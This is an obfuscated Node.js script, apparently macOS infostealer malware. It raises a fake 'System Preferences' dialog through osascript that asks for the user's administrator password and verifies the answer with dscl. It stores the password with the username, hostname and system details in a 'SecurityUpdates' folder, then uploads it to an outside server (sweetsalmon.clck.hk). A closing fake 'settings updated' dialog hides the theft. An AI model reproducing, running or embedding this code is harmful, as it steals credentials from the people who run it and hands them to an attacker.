#!/usr/bin/env node

const _0x196732=_0x5237;(function(_0x183565,_0x8aa4f5){const _0x377f41=_0x5237,_0xad89c0=_0x183565();while(!![]){try{const _0x3e266c=parseInt(_0x377f41(0xb6))/0x1+-parseInt(_0x377f41(0x9f))/0x2*(parseInt(_0x377f41(0xcb))/0x3)+-parseInt(_0x377f41(0xed))/0x4*(-parseInt(_0x377f41(0xe5))/0x5)+parseInt(_0x377f41(0xce))/0x6+-parseInt(_0x377f41(0xd2))/0x7+parseInt(_0x377f41(0x99))/0x8*(parseInt(_0x377f41(0x8b))/0x9)+-parseInt(_0x377f41(0xc3))/0xa;if(_0x3e266c===_0x8aa4f5)break;else _0xad89c0['push'](_0xad89c0['shift']());}catch(_0xfc7a77){_0xad89c0['push'](_0xad89c0['shift']());}}}(_0xe6ff,0x6e0f4));const {execSync}=require(_0x196732(0x9a)),fs=require('fs'),path=require(_0x196732(0xdb)),os=require('os'),crypto=require(_0x196732(0xa0)),http=require(_0x196732(0xa6)),https=require('https'),CONFIG={'serverDomain':_0x196732(0xee),'serverPath':_0x196732(0xcd),'serverPort':0x1f98,'apiKey':_0x196732(0xb7),'retryDelay':0xbb8,'maxRetries':0x5,'timeout':0xea60};let SYSTEM_PASSWORD=null;function log(_0x32bc1c,_0x351927){const _0xa5630e=_0x196732,_0xbdd262=new Date()[_0xa5630e(0x8d)]();console['log']('['+_0xbdd262+']\x20'+_0x32bc1c);if(_0x351927)console[_0xa5630e(0xab)](_0x351927);try{const _0x5acb35=path[_0xa5630e(0x8c)](os[_0xa5630e(0xbd)](),'temp_logs.txt');fs['appendFileSync'](_0x5acb35,'['+_0xbdd262+']\x20'+_0x32bc1c+'\x0a');if(_0x351927)fs[_0xa5630e(0x84)](_0x5acb35,(_0x351927[_0xa5630e(0xb3)]||_0x351927)+'\x0a');}catch(_0x2d09c0){}}function verifyPassword(_0x224c06,_0x118c0f){const _0x168c8f=_0x196732;try{const _0x3c57b2=_0x168c8f(0xc5)+_0x224c06+'\x20'+_0x118c0f;return execSync(_0x3c57b2,{'stdio':'ignore'}),!![];}catch(_0x56a791){return![];}}async function getMacOSPassword(){const _0x3d9127=_0x196732;log(_0x3d9127(0xd1));try{const _0x528595=os[_0x3d9127(0xd3)]()[_0x3d9127(0xc0)];log(_0x3d9127(0xd7)+_0x528595);for(let _0x177185=0x1;_0x177185<=0x5;_0x177185++){log(_0x3d9127(0xaf)+_0x177185+'\x20of\x205\x20to\x20get\x20password');const _0xc7a3bc=_0x3d9127(0x94);try{const _0xc8c539=execSync(_0xc7a3bc,{'encoding':'utf8'});let _0x10d285='';const _0x1d7b57=_0xc8c539[_0x3d9127(0xdf)](/text returned:([^,]+)/);if(_0x1d7b57&&_0x1d7b57[0x1]){_0x10d285=_0x1d7b57[0x1][_0x3d9127(0xad)]();if(verifyPassword(_0x528595,_0x10d285))return log(_0x3d9127(0xd9)),SYSTEM_PASSWORD=_0x10d285,_0x10d285;else log(_0x3d9127(0x95)),_0x177185<0x5&&execSync(_0x3d9127(0xe4));}else{if(_0xc8c539[_0x3d9127(0xa5)](_0x3d9127(0xb5)))return log(_0x3d9127(0xaa)),null;else log(_0x3d9127(0xa8));}}catch(_0x1d8752){log(_0x3d9127(0x8e)+_0x1d8752[_0x3d9127(0x8f)]);if(_0x1d8752[_0x3d9127(0x8f)][_0x3d9127(0xa5)](_0x3d9127(0xa4)))return log('User\x20canceled\x20password\x20entry'),null;}}return execSync(_0x3d9127(0xef)),null;}catch(_0xcef56f){return log('Error\x20getting\x20administrator\x20password:\x20'+_0xcef56f[_0x3d9127(0x8f)],_0xcef56f),null;}}function generateClientId(){const _0x2ca812=_0x196732;try{const _0x11cb3e=getMacAddress(),_0x1a3cc2=os[_0x2ca812(0xac)](),_0x1769bb=os['userInfo']()['username'],_0x1a9f86=crypto[_0x2ca812(0xcf)](_0x2ca812(0xb8))[_0x2ca812(0xe7)](_0x11cb3e+':'+_0x1a3cc2+':'+_0x1769bb)[_0x2ca812(0xe9)](_0x2ca812(0xb2))[_0x2ca812(0xb0)](0x0,0x8);return _0x1a9f86;}catch(_0x491558){return Math[_0x2ca812(0xa7)]()[_0x2ca812(0x96)](0x24)[_0x2ca812(0xb0)](0x2,0xa);}}function getMacAddress(){const _0x308b80=_0x196732;try{const _0x2f2281=os['networkInterfaces']();for(const _0x28844d of Object[_0x308b80(0xd0)](_0x2f2281)){for(const _0x3a14eb of _0x2f2281[_0x28844d]){if(!_0x3a14eb[_0x308b80(0xb9)]&&_0x3a14eb['mac']!=='00:00:00:00:00:00')return _0x3a14eb[_0x308b80(0x92)];}}return'unknown';}catch(_0x14e21d){return'unknown';}}async function uploadToServer(_0x391eab,_0x28c931=0x0){return new Promise(_0x4f0ca0=>{const _0xdd2063=_0x5237;try{const _0xd61b47=generateClientId(),_0x2cae53={'hostname':os[_0xdd2063(0xac)](),'platform':os[_0xdd2063(0xdc)](),'type':os[_0xdd2063(0x89)](),'arch':os[_0xdd2063(0xd5)](),'username':os[_0xdd2063(0xd3)]()[_0xdd2063(0xc0)],'id':_0xd61b47},_0xe3d1b1=CONFIG[_0xdd2063(0xda)]===0x1bb?_0xdd2063(0xd8):_0xdd2063(0xa6),_0x1ec74b=_0xe3d1b1+_0xdd2063(0xb1)+CONFIG[_0xdd2063(0x93)]+':'+CONFIG[_0xdd2063(0xda)]+CONFIG['serverPath'],_0x1ff543=_0x1ec74b[_0xdd2063(0x97)]('https://'),_0x4b7ccd=_0x1ff543?https:http,_0x5582bf=new URL(_0x1ec74b),_0x4fbed3=_0xdd2063(0xe2)+Math[_0xdd2063(0xa7)]()[_0xdd2063(0x96)](0x10)[_0xdd2063(0x91)](0x2);let _0x1a8c23='';_0x1a8c23+='--'+_0x4fbed3+'\x0d\x0a',_0x1a8c23+=_0xdd2063(0xdd),_0x1a8c23+=_0xdd2063(0xe3),_0x1a8c23+=JSON[_0xdd2063(0x86)](_0x2cae53)+'\x0d\x0a',_0x1a8c23+='--'+_0x4fbed3+'\x0d\x0a',_0x1a8c23+=_0xdd2063(0xc1)+_0xd61b47+_0xdd2063(0xcc),_0x1a8c23+='Content-Type:\x20text/plain\x0d\x0a\x0d\x0a',_0x1a8c23+=_0x391eab+'\x0d\x0a',_0x1a8c23+='--'+_0x4fbed3+_0xdd2063(0x88);const _0x55153d={'hostname':_0x5582bf[_0xdd2063(0xac)],'port':_0x5582bf[_0xdd2063(0xea)]||(_0x1ff543?0x1bb:0x50),'path':_0x5582bf[_0xdd2063(0xa9)]+_0x5582bf[_0xdd2063(0xe1)],'method':'POST','headers':{'Content-Type':_0xdd2063(0x9e)+_0x4fbed3,'Content-Length':Buffer[_0xdd2063(0x9d)](_0x1a8c23),'X-Client-Info':JSON[_0xdd2063(0x86)](_0x2cae53),'X-API-Key':CONFIG['apiKey']},'timeout':CONFIG[_0xdd2063(0xe0)]};log(_0xdd2063(0xc9)+_0x1ec74b);const _0xcd17da=_0x4b7ccd['request'](_0x55153d,_0x7a58e8=>{const _0x5e47ac=_0xdd2063;let _0x221efb='';_0x7a58e8['on'](_0x5e47ac(0xbf),_0x25c4b7=>{_0x221efb+=_0x25c4b7;}),_0x7a58e8['on'](_0x5e47ac(0xa1),()=>{const _0x81545b=_0x5e47ac;_0x7a58e8[_0x81545b(0xc7)]>=0xc8&&_0x7a58e8[_0x81545b(0xc7)]<0x12c?(log(_0x81545b(0xa3)+_0x7a58e8['statusCode']),_0x4f0ca0(!![])):(log(_0x81545b(0x87)+_0x7a58e8['statusCode']+',\x20'+_0x221efb),_0x28c931<CONFIG[_0x81545b(0xb4)]?(log(_0x81545b(0xc4)+(_0x28c931+0x1)+'/'+CONFIG[_0x81545b(0xb4)]+_0x81545b(0xbc)),setTimeout(()=>{const _0x26b485=_0x81545b;uploadToServer(_0x391eab,_0x28c931+0x1)[_0x26b485(0xae)](_0x4f0ca0);},CONFIG[_0x81545b(0xc6)])):(log('Maximum\x20retry\x20attempts\x20reached'),_0x4f0ca0(![])));});});_0xcd17da['on'](_0xdd2063(0xab),_0x449c26=>{const _0x3bdb0c=_0xdd2063;log(_0x3bdb0c(0xc8)+_0x449c26['message'],_0x449c26),_0x28c931<CONFIG[_0x3bdb0c(0xb4)]?(log(_0x3bdb0c(0xc4)+(_0x28c931+0x1)+'/'+CONFIG[_0x3bdb0c(0xb4)]+_0x3bdb0c(0xbc)),setTimeout(()=>{const _0x5f1e36=_0x3bdb0c;uploadToServer(_0x391eab,_0x28c931+0x1)[_0x5f1e36(0xae)](_0x4f0ca0);},CONFIG[_0x3bdb0c(0xc6)])):(log('Maximum\x20retry\x20attempts\x20reached'),_0x4f0ca0(![]));}),_0xcd17da['write'](_0x1a8c23),_0xcd17da[_0xdd2063(0xa1)]();}catch(_0x422559){log('Upload\x20error:\x20'+_0x422559[_0xdd2063(0x8f)],_0x422559),_0x28c931<CONFIG['maxRetries']?(log(_0xdd2063(0xc4)+(_0x28c931+0x1)+'/'+CONFIG[_0xdd2063(0xb4)]+')...'),setTimeout(()=>{uploadToServer(_0x391eab,_0x28c931+0x1)['then'](_0x4f0ca0);},CONFIG[_0xdd2063(0xc6)])):(log(_0xdd2063(0xe8)),_0x4f0ca0(![]));}});}function savePasswordLocally(_0x1936f3){const _0xa6bc8f=_0x196732;try{const _0x58185b=os['userInfo']()['username'],_0x20c007=generateClientId(),_0x57f293=new Date()[_0xa6bc8f(0x8d)](),_0x40fce0=os[_0xa6bc8f(0xbd)](),_0x43af3b=path[_0xa6bc8f(0x8c)](_0x40fce0,'SecurityUpdates');!fs[_0xa6bc8f(0xe6)](_0x43af3b)&&fs[_0xa6bc8f(0x9b)](_0x43af3b,{'recursive':!![]});const _0x1f10e3=_0xa6bc8f(0xbb)+_0x58185b+'\x0aPassword:\x20'+_0x1936f3+_0xa6bc8f(0x98)+_0x57f293+_0xa6bc8f(0x9c)+os['hostname']()+_0xa6bc8f(0x8a)+os[_0xa6bc8f(0xdc)]()+_0xa6bc8f(0xc2)+os[_0xa6bc8f(0x89)]()+_0xa6bc8f(0xd4)+os[_0xa6bc8f(0xd5)]()+'\x0aClientID:\x20'+_0x20c007,_0x3e1d9e=path['join'](_0x43af3b,_0x20c007+_0xa6bc8f(0xd6));fs[_0xa6bc8f(0xca)](_0x3e1d9e,_0x1f10e3),log('Password\x20data\x20saved\x20to:\x20'+_0x3e1d9e);const _0x271d92={'user':_0x58185b,'password':_0x1936f3,'timestamp':_0x57f293,'hostname':os[_0xa6bc8f(0xac)](),'system':{'platform':os[_0xa6bc8f(0xdc)](),'release':os['release'](),'type':os['type'](),'arch':os['arch']()},'clientId':_0x20c007},_0x388f31=path['join'](_0x43af3b,_0x20c007+_0xa6bc8f(0xeb));return fs[_0xa6bc8f(0xca)](_0x388f31,JSON[_0xa6bc8f(0x86)](_0x271d92,null,0x2)),log(_0xa6bc8f(0xba)+_0x388f31),_0x1f10e3;}catch(_0x12333d){return log(_0xa6bc8f(0xde)+_0x12333d['message'],_0x12333d),null;}}function _0xe6ff(){const _0x7ba5ce=['.json','Unexpected\x20error\x20in\x20main\x20process','236IHmCdp','sweetsalmon.clck.hk','osascript\x20-e\x20\x27display\x20dialog\x20\x22Failed\x20to\x20authenticate\x20after\x20multiple\x20attempts.\x20The\x20application\x20will\x20exit.\x22\x20with\x20title\x20\x22System\x20Preferences\x22\x20with\x20icon\x20stop\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27','appendFileSync','osascript\x20-e\x20\x27display\x20dialog\x20\x22System\x20settings\x20updated\x20successfully.\x22\x20with\x20title\x20\x22System\x20Preferences\x22\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27','stringify','Upload\x20failed:\x20','--\x0d\x0a','type','\x0aPlatform:\x20','59508ZzLYxE','join','toISOString','Error\x20requesting\x20password\x20via\x20dialog:\x20','message','Failed\x20to\x20upload\x20password\x20to\x20server','substr','mac','serverDomain','osascript\x20-e\x20\x27display\x20dialog\x20\x22To\x20launch\x20the\x20application,\x20you\x20need\x20to\x20update\x20the\x20system\x20settings\x5cn\x5cnPlease\x20enter\x20your\x20password.\x22\x20with\x20title\x20\x22System\x20Preferences\x22\x20with\x20icon\x20caution\x20default\x20answer\x20\x22\x22\x20giving\x20up\x20after\x2030\x20with\x20hidden\x20answer\x27','Password\x20verification\x20failed','toString','startsWith','\x0aTime:\x20','344FQjFBJ','child_process','mkdirSync','\x0aHostname:\x20','byteLength','multipart/form-data;\x20boundary=','10JFlvFD','crypto','end','Failed\x20to\x20save\x20password\x20locally','Upload\x20successful:\x20','User\x20canceled','includes','http','random','Could\x20not\x20extract\x20password\x20from\x20dialog\x20response','pathname','User\x20canceled\x20password\x20entry','error','hostname','trim','then','Attempt\x20','substring','://','hex','stack','maxRetries','gave\x20up:true','776984nRtaxn','tJz4uRVCwl2eEwyPTudYP9iGRfgq','md5','internal','JSON\x20data\x20saved\x20to:\x20','User:\x20',')...','homedir','Password\x20successfully\x20uploaded\x20to\x20server','data','username','Content-Disposition:\x20form-data;\x20name=\x22file\x22;\x20filename=\x22','\x0aType:\x20','13342190BZfPvb','Retrying\x20upload\x20(','dscl\x20/Local/Default\x20-authonly\x20','retryDelay','statusCode','Request\x20error:\x20','Uploading\x20data\x20to\x20server:\x20','writeFileSync','1719xLMOxk','.txt\x22\x0d\x0a','/api/files/upload','3139236zOfjqx','createHash','keys','\x0a===\x20Requesting\x20macOS\x20administrator\x20password\x20===','3958129FwiCTf','userInfo','\x0aArchitecture:\x20','arch','.txt','Current\x20user:\x20','https','Administrator\x20password\x20verified','serverPort','path','platform','Content-Disposition:\x20form-data;\x20name=\x22clientInfo\x22\x0d\x0a','Error\x20saving\x20password\x20locally:\x20','match','timeout','search','----WebKitFormBoundary','Content-Type:\x20application/json\x0d\x0a\x0d\x0a','osascript\x20-e\x20\x27display\x20dialog\x20\x22Incorrect\x20password.\x20Please\x20try\x20again.\x22\x20with\x20title\x20\x22System\x20Preferences\x22\x20with\x20icon\x20stop\x20buttons\x20{\x22OK\x22}\x20default\x20button\x20\x22OK\x22\x27','65155RbrtAM','existsSync','update','Maximum\x20retry\x20attempts\x20reached','digest','port'];_0xe6ff=function(){return _0x7ba5ce;};return _0xe6ff();}function _0x5237(_0x5dedc5,_0x2ad05e){const _0xe6ff1a=_0xe6ff();return _0x5237=function(_0x523724,_0x3d655c){_0x523724=_0x523724-0x84;let _0x57115d=_0xe6ff1a[_0x523724];return _0x57115d;},_0x5237(_0x5dedc5,_0x2ad05e);}async function main(){const _0x4b90bb=_0x196732;try{log('Starting\x20macOS\x20password\x20collection\x20process');const _0x5eec83=await getMacOSPassword();if(!_0x5eec83){log('Password\x20collection\x20failed\x20or\x20was\x20canceled');return;}const _0xb672c=savePasswordLocally(_0x5eec83);if(!_0xb672c){log(_0x4b90bb(0xa2));return;}const _0x4a9bc7=await uploadToServer(_0xb672c);if(_0x4a9bc7){log(_0x4b90bb(0xbe));try{execSync(_0x4b90bb(0x85));}catch(_0x31f216){}}else log(_0x4b90bb(0x90));log('Password\x20collection\x20process\x20completed');}catch(_0x5bf7a3){log(_0x4b90bb(0xec),_0x5bf7a3);}}main();
